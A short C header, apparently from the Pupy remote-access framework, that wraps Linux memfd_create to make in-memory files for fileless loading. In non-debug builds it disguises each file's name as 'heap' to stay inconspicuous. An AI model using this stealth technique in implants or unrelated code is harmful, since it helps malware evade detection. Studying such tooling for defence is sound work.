#ifndef _PUPY_MEMFD_H
#define _PUPY_MEMFD_H

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <string.h>
#include <stdbool.h>

#define MFD_CLOEXEC         0x0001U
#define MFD_ALLOW_SEALING   0x0002U

#ifndef __NR_memfd_create
 #ifdef __x86_64__
  #define __NR_memfd_create 319
 #elif __i386__
  #define __NR_memfd_create 356
 #endif
#endif

#ifndef F_ADD_SEALS
#define F_ADD_SEALS    (1024 + 9)
#define F_SEAL_SEAL    0x0001
#define F_SEAL_SHRINK  0x0002
#define F_SEAL_GROW    0x0004
#define F_SEAL_WRITE   0x0008
#endif

#define MEMFD_FILE_PATH "/proc/self/fd/"

inline static int pupy_memfd_create(char *path, unsigned int path_size)
{
#ifndef DEBUG
	memset(path, 0x0, path_size);
	strncpy(path, "heap", path_size);
#endif

    int fd = syscall(__NR_memfd_create, path, MFD_CLOEXEC | MFD_ALLOW_SEALING);

    if (fd == -1) {
        return -1;
    }

    snprintf(path, path_size, MEMFD_FILE_PATH "%d", fd);
    return fd;
}

inline static bool is_memfd_path(const char *path)
{
    return !strncmp(path, MEMFD_FILE_PATH, strlen(MEMFD_FILE_PATH));
}

#endif
